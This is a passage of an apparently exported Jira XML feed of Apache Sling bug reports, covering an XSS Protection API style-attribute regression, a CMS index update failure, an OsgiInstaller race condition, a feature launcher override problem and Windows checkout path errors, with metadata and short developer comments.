                    <description>&lt;p&gt;When trying to add the &#8216;style&#8217; property &#8216;text-align: right&#8217; (or center) the text will be displayed as left-aligned.&lt;/p&gt;

&lt;p&gt;T&lt;font color=&quot;#1d1c1d&quot;&gt;his is regression compared to the previous version&lt;/font&gt;.&lt;/p&gt;



&lt;p&gt;Expected Behavior: Text should be displayed on the right or center like decelerated in the &#8216;style=&#8220;text-align:...&#8220;&#8217; property.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13521504">SLING-11763</key>
            <summary> Not all &apos;style&apos; properties are preserved in the HTML output.</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="tvogel">Tatyana Vogel</assignee>
                                    <reporter username="tvogel">Tatyana Vogel</reporter>
                        <labels>
                    </labels>
                <created>Wed, 25 Jan 2023 15:12:17 +0000</created>
                <updated>Wed, 15 Feb 2023 10:24:26 +0000</updated>
                            <resolved>Wed, 25 Jan 2023 16:18:55 +0000</resolved>
                                    <version>XSS Protection API 2.3.0</version>
                                    <fixVersion>XSS Protection API 2.3.4</fixVersion>
                                    <component>XSS Protection API</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17680679" author="rombert" created="Wed, 25 Jan 2023 16:18:55 +0000"  >&lt;p&gt;PR applied, thanks for the fix &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=tvogel&quot; class=&quot;user-hover&quot; rel=&quot;tvogel&quot;&gt;tvogel&lt;/a&gt;!&lt;/p&gt;</comment>
                            <comment id="17684643" author="kwin" created="Mon, 6 Feb 2023 12:48:10 +0000"  >&lt;p&gt;FTR: This also leads to escaping single quotes within style, e.g.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&amp;lt;style&amp;gt;
        :root {
--font-family-basic-secondary:&amp;amp;#39;my font&amp;amp;#39;,arial,sans-serif;
...
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                            <comment id="17686544" author="rombert" created="Thu, 9 Feb 2023 14:19:14 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; - do you see this issue after the 2.3.4 release? If you think it&apos;s a regression, please create an issue, ideally with a test case or problematic input.&lt;/p&gt;</comment>
                            <comment id="17688322" author="kwin" created="Tue, 14 Feb 2023 06:58:38 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; Sorry for the noise here, in fact my observation is not related as in the custom code another context has been used (html).&lt;/p&gt;</comment>
                            <comment id="17689009" author="rombert" created="Wed, 15 Feb 2023 10:24:26 +0000"  >&lt;p&gt;All good, thanks for confirming &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 36 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fdww:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11759] CMS - Cannot Update Indexes</title>
                <link>https://issues.apache.org/jira/browse/SLING-11759</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When updating the CMS to the latest version, index definition s are not applies and cannot be updated in the running instance&lt;/p&gt;</description>
                <environment></environment>
        <key id="13520905">SLING-11759</key>
            <summary>CMS - Cannot Update Indexes</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Sat, 21 Jan 2023 20:26:04 +0000</created>
                <updated>Fri, 3 Feb 2023 18:00:56 +0000</updated>
                            <resolved>Mon, 23 Jan 2023 03:29:05 +0000</resolved>
                                    <version>App CMS 1.1.4</version>
                                    <fixVersion>App CMS 1.1.6</fixVersion>
                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17679667" author="dklco" created="Mon, 23 Jan 2023 03:29:05 +0000"  >&lt;p&gt;Fixed with &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-app-cms/commit/234588f2e2f709af1cd669e2af2140993561af1b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-app-cms/commit/234588f2e2f709af1cd669e2af2140993561af1b&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 39 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fa8w:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11754] Race condition in OsgiInstaller</title>
                <link>https://issues.apache.org/jira/browse/SLING-11754</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/master/src/main/java/org/apache/sling/installer/core/impl/OsgiInstallerImpl.java#L143&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;OsgiInstallerImpl&lt;/a&gt; is using &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/master/src/main/java/org/apache/sling/installer/core/impl/SortingServiceTracker.java#L87&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;SortingServiceTracker&lt;/a&gt; to schedule a retry of the OSGi installer run when new service of type ResourceTransformer is added. During the OSGi installer run, the list of available ResourceTransformer services is loaded to &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/master/src/main/java/org/apache/sling/installer/core/impl/OsgiInstallerImpl.java#L953&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;transform resources&lt;/a&gt;.&#160;&#160;&lt;/p&gt;

&lt;p&gt;It might happen that the list of available ResourceTransformer services will be loaded during transforming resources before the new ResourceTransformer which triggered the OSGi installer run will be available in the SortingServiceTracker instance, because the scheduleRetry call is done in SortingServiceTracker.addingService not when the service is already available in SortingServiceTracker but during the preparation of the service instance (the instance returned from SortingServiceTracker.addingService is later added to services list in SortingServiceTracker).&lt;/p&gt;

&lt;p&gt;So in other words, there is a race condition between adding a new service instance to SortingServiceTracker services list and OSGi installer run which perform getting the instances of ResourceTransformer services from the SortingServiceTracker.&lt;/p&gt;

&lt;p&gt;In the result activation of ResourceTransformer might trigger the OSGi installer run but the service will not be found during the run.&lt;/p&gt;

&lt;p&gt;Example issue caused by this:&lt;/p&gt;

&lt;p&gt;If such a last OSGi installer run would be caused by activation of &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/master/src/main/java/org/apache/sling/installer/core/impl/OsgiInstallerImpl.java#L953&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PackageTransformer&lt;/a&gt; the untransformed content packages (for example added by OSGI feature model during the first start of the instance) stays untransformed.&lt;/p&gt;

&lt;p&gt;In our pipelines for PRs validation this is happening very often.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13518331">SLING-11754</key>
            <summary>Race condition in OsgiInstaller</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="pboguski">Pawe&#65533;&#65533; Boguski</reporter>
                        <labels>
                    </labels>
                <created>Fri, 13 Jan 2023 13:30:25 +0000</created>
                <updated>Thu, 26 Jan 2023 10:49:05 +0000</updated>
                                            <version>Installer Packages Factory 1.0.4</version>
                    <version>Installer Core 3.12.0</version>
                                                    <component>Installer</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17680946" author="michalcukierman" created="Thu, 26 Jan 2023 10:37:32 +0000"  >&lt;p&gt;In other words, SortingServiceTracker&#160; invokes: `scheduleRetry` in the new thread. &lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/cf05c81bb063ff8a19ffd083d6e1a175b630abc5/src/main/java/org/apache/sling/installer/core/impl/SortingServiceTracker.java#L87&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-installer-core/blob/&lt;/a&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/master/src/main/java/org/apache/sling/installer/core/impl/SortingServiceTracker.java#L126&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;master&lt;/a&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/cf05c81bb063ff8a19ffd083d6e1a175b630abc5/src/main/java/org/apache/sling/installer/core/impl/SortingServiceTracker.java#L87&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;/src/main/java/org/apache/sling/installer/core/impl/SortingServiceTracker.java#L87&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The new thread depends on the state of the same service tracker:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-core/blob/master/src/main/java/org/apache/sling/installer/core/impl/SortingServiceTracker.java#L126&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-installer-core/blob/master/src/main/java/org/apache/sling/installer/core/impl/SortingServiceTracker.java#L126&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;I guess the simplest solution would be to override and synchronize:&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;SortingServiceTracker.addingService (which updates the state of the object)&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;SortingServiceTracker.getTrackingCount (which uses the state of the object from the other thread)&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;and eventually:&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;SortingServiceTracker.getServiceReferences (which updates the state of the object)&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;This is definitely not a best solution, but should work. What do you think?&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Looks like the solutions is too naive &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/wink.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 38 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1eueg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11747] Unable to override the built-in content package feature model extension</title>
                <link>https://issues.apache.org/jira/browse/SLING-11747</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;With &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10956&quot; title=&quot;Create assembly for feature launcher&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10956&quot;&gt;&lt;del&gt;SLING-10956&lt;/del&gt;&lt;/a&gt; we now have an assembly which allows us to drop in additional extensions and/or dependencies in the lib directory and have them located by the Feature Launcher using the &lt;tt&gt;ServiceLoader&lt;/tt&gt; mechanism.&lt;/p&gt;

&lt;p&gt;That mechanism does not work for the &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-extension-content&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;content extension&lt;/a&gt;. This extension is special because the handler it provides - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-extension-content/blob/master/src/main/java/org/apache/sling/feature/extension/content/ContentHandler.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-extension-content/blob/master/src/main/java/org/apache/sling/feature/extension/content/ContentHandler.java&lt;/a&gt;  - is supposed to override the buit-in handler from &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-launcher/blob/master/src/main/java/org/apache/sling/feature/launcher/impl/extensions/handlers/ContentPackageHandler.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-launcher/blob/master/src/main/java/org/apache/sling/feature/launcher/impl/extensions/handlers/ContentPackageHandler.java&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;It seems that the way the classpath is created by the launcher script does not allow &apos;extension&apos; jars to override classes provided by the main jar file. I have looked at the &lt;a href=&quot;https://docs.oracle.com/javase/8/docs/api/index.html?java/util/ServiceLoader.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ServiceLoader javadoc&lt;/a&gt; and it states that    &lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;When adding providers to the cache, the Iterator processes resources in the order that the ClassLoader.getResources(String) method finds the service configuration files.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;In practice, I was only able to make the extension override the build-in handled by prepending it to the classpath.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13516383">SLING-11747</key>
            <summary>Unable to override the built-in content package feature model extension</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 3 Jan 2023 22:26:15 +0000</created>
                <updated>Mon, 9 Jan 2023 12:03:15 +0000</updated>
                            <resolved>Wed, 4 Jan 2023 08:51:36 +0000</resolved>
                                    <version>Feature Model Launcher 1.2.2</version>
                                    <fixVersion>Feature Model Launcher 1.2.4</fixVersion>
                                    <component>Feature Model</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 42 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1eii0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11746] Cannot Checkout CMS App in Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11746</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Per &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; the repository contains paths that are invalid on windows:&lt;/p&gt;

&lt;p&gt;error: invalid path &apos;reference/src/main/resources/jcr_root/oak:index/slingPage/indexRules/sling:Page/properties/hideInSitemap.json&apos;&lt;br/&gt;
fatal: unable to checkout working tree&lt;/p&gt;</description>
                <environment></environment>
        <key id="13516125">SLING-11746</key>
            <summary>Cannot Checkout CMS App in Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Sun, 1 Jan 2023 17:20:33 +0000</created>
                <updated>Mon, 23 Jan 2023 03:29:36 +0000</updated>
                            <resolved>Mon, 23 Jan 2023 03:29:36 +0000</resolved>
                                                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17679668" author="dklco" created="Mon, 23 Jan 2023 03:29:36 +0000"  >&lt;p&gt;Fixed with &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-app-cms/commit/618c02c1546a09182858741a1e1f083733e61d4f&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-app-cms/commit/618c02c1546a09182858741a1e1f083733e61d4f&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 39 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1egwo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11739] Index definition extraction from content packages is missing binary files data</title>
                <link>https://issues.apache.org/jira/browse/SLING-11739</link>
                <project id="12310710" key="SLING">Sling</project>
